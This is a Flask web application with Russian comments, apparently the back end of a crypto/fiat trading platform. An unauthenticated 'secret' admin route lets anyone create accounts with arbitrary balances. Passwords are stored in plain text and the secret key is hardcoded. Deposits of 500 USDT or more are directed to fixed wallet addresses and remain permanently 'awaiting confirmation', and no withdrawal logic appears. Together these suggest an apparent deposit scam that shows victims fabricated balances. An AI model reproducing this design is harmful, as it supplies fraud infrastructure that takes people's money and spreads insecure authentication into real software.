import os
from flask import Flask, render_template, request, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.secret_key = 'your_super_secret_key_change_this'

# --- НАСТРОЙКА БАЗЫ ДАННЫХ (SQLite для Mac, PostgreSQL для Render) ---
# Render предоставляет URL базы через переменную DATABASE_URL
database_url = os.environ.get('DATABASE_URL')
if database_url and database_url.startswith("postgres://"):
    # Фикс для SQLAlchemy, так как Render дает префикс postgres://, а нужно postgresql://
    database_url = database_url.replace("postgres://", "postgresql://", 1)

basedir = os.path.abspath(os.path.dirname(__file__))
app.config['SQLALCHEMY_DATABASE_URI'] = database_url or ('sqlite:///' + os.path.join(basedir, 'database.db'))
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# --- МОДЕЛИ ДАННЫХ ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False) # В будущем лучше хэшировать
    balance_usdt = db.Column(db.Float, default=0.0)
    balance_uah = db.Column(db.Float, default=0.0)
    currency_in = db.Column(db.String(10), default='UAH')
    currency_out = db.Column(db.String(10), default='UAH')

class DepositRequest(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    date = db.Column(db.String(20), default='24.12.2025')
    wallet = db.Column(db.String(120), default='0x09E99EBCee0344FC2C8BE6D03760e4BDeE643C90')
    status = db.Column(db.String(50), default='Ожидается подтверждение платежа')

# Инициализация базы данных
with app.app_context():
    db.create_all()

# --- СИККРЕТ МАРШРУТ ДЛЯ ДОБАВЛЕНИЯ ПОЛЬЗОВАТЕЛЕЙ ---
@app.route('/admin-create-user', methods=['GET', 'POST'])
def admin_create_user():
    message = None
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        c_in = request.form.get('currency_in', 'UAH')
        c_out = request.form.get('currency_out', 'UAH')
        
        # Получаем балансы из формы (если пусто — будет 0)
        b_usdt = float(request.form.get('balance_usdt') or 0.0)
        b_fiat = float(request.form.get('balance_fiat') or 0.0)

        if User.query.filter_by(email=email).first():
            message = "Ошибка: Пользователь с такой почтой уже существует!"
        else:
            # Создаем пользователя со всеми настройками
            new_user = User(
                email=email, 
                password=password, 
                currency_in=c_in, 
                currency_out=c_out,
                balance_usdt=b_usdt,
                balance_uah=b_fiat  # В базе поле называется balance_uah, но хранит выбранный фиат
            )
            db.session.add(new_user)
            db.session.commit()
            message = f"Успех! Пользователь {email} создан ({c_out}). Баланс: {b_usdt} USDT / {b_fiat} {c_out}"
    
    # Список валют для удобства
    currencies = ['UAH', 'RUB', 'KGS', 'TJS', 'KZT', 'AED', 'USD', 'EUR']
    
    options = "".join([f'<option value="{c}">{c}</option>' for c in currencies])

    return f'''
        <div style="max-width: 450px; margin: 40px auto; font-family: sans-serif; border: 1px solid #ddd; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
            <h2 style="text-align: center; margin-top: 0;">Добавить пользователя</h2>
            {f'<p style="color: white; background: #28a745; padding: 10px; border-radius: 5px; text-align: center;">{message}</p>' if message else ''}
            
            <form method="post">
                <label style="display:block; margin-bottom: 5px;">Email (Логин):</label>
                <input type="email" name="email" required style="width:100%; padding:10px; margin-bottom:15px; border: 1px solid #ccc; border-radius: 5px;">
                
                <label style="display:block; margin-bottom: 5px;">Пароль:</label>
                <input type="text" name="password" required style="width:100%; padding:10px; margin-bottom:15px; border: 1px solid #ccc; border-radius: 5px;">

                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <div style="flex: 1;">
                        <label style="display:block; margin-bottom: 5px;">Баланс USDT:</label>
                        <input type="number" step="0.01" name="balance_usdt" placeholder="0.00" style="width:100%; padding:10px; border: 1px solid #ccc; border-radius: 5px;">
                    </div>
                    <div style="flex: 1;">
                        <label style="display:block; margin-bottom: 5px;">Баланс Фиат:</label>
                        <input type="number" step="0.01" name="balance_fiat" placeholder="0.00" style="width:100%; padding:10px; border: 1px solid #ccc; border-radius: 5px;">
                    </div>
                </div>

                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
                    <div style="flex: 1;">
                        <label style="display:block; margin-bottom: 5px;">Валюта Входа:</label>
                        <select name="currency_in" style="width:100%; padding:10px; border: 1px solid #ccc; border-radius: 5px;">
                            {options}
                            <option value="USDT">USDT</option>
                        </select>
                    </div>
                    <div style="flex: 1;">
                        <label style="display:block; margin-bottom: 5px;">Валюта Выхода:</label>
                        <select name="currency_out" style="width:100%; padding:10px; border: 1px solid #ccc; border-radius: 5px;">
                            {options}
                        </select>
                    </div>
                </div>
                
                <button type="submit" style="width:100%; padding:12px; cursor:pointer; background: #007bff; color: white; border: none; border-radius: 5px; font-weight: bold;">СОЗДАТЬ ПОЛЬЗОВАТЕЛЯ</button>
            </form>
            <br><a href="/" style="display: block; text-align: center; color: #666; text-decoration: none;">← На главную</a>
        </div>
    '''

# --- ОСНОВНЫЕ МАРШРУТЫ ---
@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        user = User.query.filter_by(email=email).first()
        if user and user.password == password:
            session['user_id'] = user.id
            return redirect(url_for('dashboard'))
        error = "Неверная почта или пароль"
    return render_template('login.html', error=error)

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    return render_template('dashboard.html', user=user)

@app.route('/wallets')
def wallets():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    return render_template('wallets.html', user=user)

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    
    if request.method == 'POST':
        user.currency_in = request.form.get('base_currency_in')
        user.currency_out = request.form.get('base_currency_out')
        db.session.commit()
        return redirect(url_for('settings'))

    commissions = {'in': '5.7%', 'out': '2.0%'}
    return render_template('settings.html', user=user, commissions=commissions)

@app.route('/sales')
def sales():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    return render_template('sales.html', user=user)

@app.route('/buy')
def buy():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    return render_template('buy.html', user=user)

@app.route('/balance', methods=['GET', 'POST'])
def balance():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    user = db.session.get(User, session['user_id'])
    
    if request.method == 'POST':
        amount_val = request.form.get('amount')
        if amount_val:
            amount = float(amount_val)
            if amount >= 500:
                new_request = DepositRequest(user_id=user.id, amount=amount)
                db.session.add(new_request)
                db.session.commit()
        return redirect(url_for('balance'))

    history = DepositRequest.query.filter_by(user_id=user.id).order_by(DepositRequest.id.desc()).all()
    
    deposit_info = {
        'address': 'TRrqqVmgoRhiRPaGUPgtZcWKeDCGLjyy9Y',
        'network': 'Сеть TRC 20',
        'limit': '500 USDT'
    }
    
    return render_template('balance.html', user=user, info=deposit_info, history=history)

@app.route('/history')
def history():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    return render_template('history.html', user=user)

@app.route('/disputes')
def disputes():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = db.session.get(User, session['user_id'])
    return render_template('disputes.html', user=user)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    # На Render порт задается через переменную PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)